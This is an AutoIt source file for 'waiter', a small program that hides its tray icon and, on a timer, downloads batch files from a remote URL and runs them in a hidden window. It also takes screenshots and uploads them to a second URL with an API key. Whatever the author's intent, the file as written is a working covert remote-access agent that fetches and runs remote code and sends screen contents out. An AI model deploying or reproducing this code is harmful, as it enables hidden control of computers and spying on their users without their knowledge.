#include <Date.au3>
#include <Crypt.au3>
#include <GDIPlus.au3>
#include <ScreenCapture.au3>

#include "Key.au3"

$DEFAULT_URL = "http://waiter.cgh.io/waiter"
$DEFAULT_SCREENSHOT = "http://waiter.cgh.io/screenshot"
$DEFAULT_PERIOD = 10
$TEMPDIR = @TempDir & "\waiter"

AutoItSetOption("TrayIconHide", 1)

Func Help()
  Logs("Get and execute commands and take screenshots for a period of time.")
  Logs("Report bugs to caiguanhao@gmail.com.")
  Logs()
  Logs("Usage: waiter [OPTION]")
  Logs()
  Logs("Option:")
  Logs("  -h, --help               Show this help and exit")
  Logs("  -u, --url        <url>   URL to query for commands")
  Logs("  -p, --period     <secs>  Wait n seconds after each query")
  Logs("  -s, --screenshot <url>   Screenshot API address. ")
  Logs('                           Use "-" to disable.')
  Logs()
  Logs("Defaults:")
  Logs("  --url        " & $DEFAULT_URL)
  Logs("  --period     " & $DEFAULT_PERIOD)
  Logs("  --screenshot " & $DEFAULT_SCREENSHOT)
  Logs()
  Logs("API key:")
  Logs("  " & StringLeft($Key, 20) & " ... " & StringLen($Key) & " characters")
  Logs()
  Exit
EndFunc

Func Error($error, $errno = 1)
  Logs($error)
  Logs()
  Exit $errno
EndFunc

Func ConsoleLog($text = "")
  Logs("[" & _NowTime(5) & "] " & $text)
EndFunc

Func Logs($text = "")
  ConsoleWrite($text & @CRLF)
EndFunc

Func GetOpt($i)
  if $i == $CmdLine[0] or (StringLeft($CmdLine[$i + 1], 1) == "-" and _
    $CmdLine[$i + 1] <> "-" ) Then
    Error("Value not provided for option: " & $CmdLine[$i] & ".")
  Else
    $skipCheck = 1
    return StringStripWS($CmdLine[$i + 1], 3)
  EndIf
EndFunc

Local $url = $DEFAULT_URL
Local $period = $DEFAULT_PERIOD
Local $screenshot = $DEFAULT_SCREENSHOT
Local $skipCheck = 0

For $i = 1 To $CmdLine[0]
  Switch $CmdLine[$i]
  Case "-h", "--help"
    Help()
  Case "-u", "--url"
    $url = GetOpt($i)
  Case "-s", "--screenshot"
    $screenshot = GetOpt($i)
  Case "-p", "--period"
    $period = Number(GetOpt($i))
  Case Else
    If $skipCheck == 0 Then
      Error("Unknown option or value: " & $CmdLine[$i] & ".")
    Else
      $skipCheck = 0
    EndIf
  EndSwitch
Next

If $period <= 2 Then
  Error("Time period should be more than 2 (seconds).")
EndIf
If $period > 999 Then
  Error("Time period should not be more than 999 (seconds).")
EndIf

If StringInStr(FileGetAttrib($TEMPDIR), "D") = 0 Then
  FileDelete($TEMPDIR)
EndIf
If Not FileExists($TEMPDIR) Then
  DirCreate($TEMPDIR)
EndIf

While 1
  Local $tempFile = $TEMPDIR & "\new.bat"
  $bytes = InetGet($url, $tempFile, 1 + 2 + 4)
  If $bytes > 0 Then
    $hash = _Crypt_HashFile($tempFile, $CALG_MD5)
    $filename = $hash & ".bat"
    Local $newTempFile = $TEMPDIR & "\" & $filename
    If Not FileExists($newTempFile) Then
      ConsoleLog("Downloaded " & $bytes & " bytes from " & $url & ".")
      FileMove($tempFile, $newTempFile, 1 + 8)
      ConsoleLog("And the file was saved as " & $filename & ".")
      $pid = Run($newTempFile, "", @SW_HIDE, 0x10000)
      ConsoleLog("And the file was executed as PID " & $pid & ".")
    EndIf
  Else
    ConsoleLog("Downloaded nothing from " & $url & ".")
  EndIf
  FileDelete($tempFile)
  If $screenshot <> "-" Then
    $screenshotfile = $TEMPDIR & "\screenshot.jpg"
    TakeScreenshot($screenshotfile, 480)
    SendScreenshot($screenshotfile, $screenshot)
  EndIf
  Sleep($period * 1000)
Wend

Func SendScreenshot($filepath, $to)
  $http = ObjCreate("winhttp.winhttprequest.5.1")
  $http.Open("POST", $to, False)
  $http.SetRequestHeader("Key", $KEY)
  $file = FileOpen($filepath, 16)
  $data = FileRead($file)
  $http.Send($data)
  $status = $http.Status
  If $status == "" Then
    $status = "nothing"
  Else
    $status = $status & " status"
  EndIf
  ConsoleLog("Screenshot HTTP-POST request returned " & $status & ".")
EndFunc

Func TakeScreenshot($filepath, $width = 0)
  $bitmap = _ScreenCapture_Capture()
  If $width = 0 Then
    _ScreenCapture_SaveImage($filepath, $bitmap)
    _WinAPI_DeleteObject($bitmap)
  Else
    _GDIPlus_Startup()
    $image = _GDIPlus_BitmapCreateFromHBITMAP($bitmap)
    _WinAPI_DeleteObject($bitmap)
    $scale = _GDIPlus_ImageGetWidth($image) / $width
    $height = _GDIPlus_ImageGetHeight($image) / $scale
    $thumb = _GDIPlus_GetImageThumbnail($image, $width, $height)
    _GDIPlus_ImageDispose($image)
    _GDIPlus_ImageSaveToFile($thumb, $filepath)
    _GDIPlus_ImageDispose($thumb)
    _GDIPlus_Shutdown()
  EndIf
EndFunc

Func _GDIPlus_GetImageThumbnail($image, $width, $height)
    Local $Ret = DllCall($ghGDIPDll, _
      'int',  'GdipGetImageThumbnail', _
      'ptr',  $image, _
      'int',  $width, _
      'int',  $height, _
      'ptr*', 0, _
      'ptr',  0, _
      'ptr',  0)
    If (@error) Or ($Ret[0]) Then
        Return SetError(1, 0, 0)
    EndIf
    Return $Ret[4]
EndFunc
